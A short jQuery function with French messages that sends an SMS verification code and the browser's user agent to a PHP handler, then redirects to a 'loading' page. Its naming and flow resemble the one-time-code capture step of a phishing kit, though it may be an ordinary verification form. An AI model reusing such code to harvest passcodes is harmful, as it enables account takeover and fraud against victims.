function smspass(){
	
var SMS_CR	 =	 $("#sms_code").val();
	

	
if(SMS_CR==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Corriger votre saisie"

})	

return false;	
}


var data_sms = 
{
DEVICE_CR : navigator.userAgent,
SMS_CR    :	SMS_CR

}; 
$('#cover-spin').show(0);

console.log(JSON.stringify(data_sms));
var _url = '../config/data_sms.php';


$.post(_url,data_sms,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	

     

   window.location="../Select/loading.html";

} 


}) 
}